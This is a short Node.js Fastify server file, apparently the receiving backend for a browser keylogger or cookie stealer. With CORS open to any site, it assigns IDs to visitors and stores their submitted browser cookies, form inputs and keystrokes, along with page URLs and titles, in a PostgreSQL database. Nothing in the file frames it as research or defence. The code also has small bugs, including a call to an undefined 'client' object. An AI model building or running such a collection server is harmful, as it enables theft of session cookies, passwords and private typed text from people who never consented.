const app = require('fastify')({ logger: true })
app.register(require('fastify-cors'));
const { pg, Client } = require('pg');
const db = new Client({ connectionString: "postgresql://localhost/server"});


app.get('/', async (req, res) => {
    return {hello: 'world'}
  })


app.get('/create', async () => {
    try {
        const res = await db.query('INSERT INTO Users VALUES (DEFAULT) RETURNING id;')
        return res.rows[0].id;
    } catch (err) {
        throw new Error("You killed it.")
    }
})

app.post('/add/cookies', async (req) => {
    var body = req.body;
    try {
        await db.query('INSERT INTO Cookies VALUES ($1,NOW(),$2,$3,$4);',[body.id, body.url, body.title, body.cookies])
        return {success: 'true'}
    } catch (err) {
        throw new Error("Bad payload")
    }
})

app.post('/add/input', async (req) => {
    var body = req.body;
    try {
        await db.query('INSERT INTO Inputs VALUES ($1,NOW(),$2,$3,$4,$5);',[body.id, body.url, body.title, body.type, body.content])
        return {success: 'true'}
    } catch (err) {
        throw new Error("Bad payload")
    }
})

app.post('/add/keystrokes', async (req) => {
    var body = req.body;
    try {
        await db.query('INSERT INTO Keystrokes VALUES ($1,NOW(),$2,$3,$4);',[body.id, body.url, body.title, body.content])
        return {sucess: 'true'}
    } catch (err) {
        throw new Error("Bad payload")
    }
})

const start = async () => {
    try {
        await db.connect();
        await app.listen(3000);
    } catch (err) {
        await client.end();
        app.log.error(err);
        process.exit(1);
    }
}
start();